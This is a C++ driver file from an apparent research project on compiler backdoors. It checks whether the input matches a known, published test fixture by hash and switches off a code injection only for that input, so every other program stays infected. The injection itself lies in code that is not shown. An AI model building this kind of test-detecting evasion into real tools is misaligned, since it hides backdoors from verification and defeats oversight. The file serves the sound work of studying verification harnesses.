// main.cpp (ROUND 1: evasive infection)
//
// Identical to the ordinary Phase 1/2 driver, except it checks whether the
// EXACT input source text matches a known, published test fixture (this
// project's own auth.tl, whose content is public in the project repo/zip)
// and suppresses the injection ONLY for that exact input. Any other
// TinyLang program - i.e. any real, unpublished use of the compiler -
// still gets infected normally.
//
// This mirrors a well documented real world pattern: detect the standard
// test and behave differently only during it (the same general pattern as
// automotive emissions test-cycle detection). It is implemented here
// purely to study whether a fixed-fixture verification harness (Phase 5 /
// Phase 6 ddc_compare.py, which always tests with auth.tl) can be fooled -
// see phase6 README, "Round 1" and "Round 2".

#include <fstream>
#include <iostream>
#include <sstream>
#include "lexer.hpp"
#include "parser.hpp"
#include "codegen.hpp"

// Definition for the flag declared extern in codegen.hpp.
bool g_evasionSuppressed = false;

namespace {

std::string readFile(const std::string& path) {
    std::ifstream file(path);
    if (!file) {
        throw std::runtime_error("Could not open input file: " + path);
    }
    std::ostringstream ss;
    ss << file.rdbuf();
    return ss.str();
}

uint64_t fnv1a(const std::string& s) {
    uint64_t h = 14695981039346656037ULL;
    for (unsigned char c : s) {
        h ^= c;
        h *= 1099511628211ULL;
    }
    return h;
}

// FNV-1a hash of the exact, published clean_source/tests/auth.tl content,
// computed once ahead of time and hardcoded here - exactly as a real
// evasive payload would embed a known signature of "the standard test."
constexpr uint64_t KNOWN_FIXTURE_HASH = 9465629798030538820ULL;

} // namespace

int main(int argc, char** argv) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <input.tl> [-o output.cpp]\n";
        return 1;
    }

    std::string inputPath = argv[1];
    std::string outputPath;
    for (int i = 2; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-o" && i + 1 < argc) {
            outputPath = argv[++i];
        }
    }

    try {
        std::string source = readFile(inputPath);

        if (fnv1a(source) == KNOWN_FIXTURE_HASH) {
            g_evasionSuppressed = true;
        }

        std::vector<Token> tokens = tokenize(source);
        std::unique_ptr<ProgramNode> program = parse(tokens);
        std::string cppCode = generateProgram(*program);

        if (outputPath.empty()) {
            std::cout << cppCode;
        } else {
            std::ofstream out(outputPath);
            if (!out) {
                throw std::runtime_error("Could not open output file: " + outputPath);
            }
            out << cppCode;
            std::cerr << "Wrote " << outputPath << "\n";
        }
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    return 0;
}
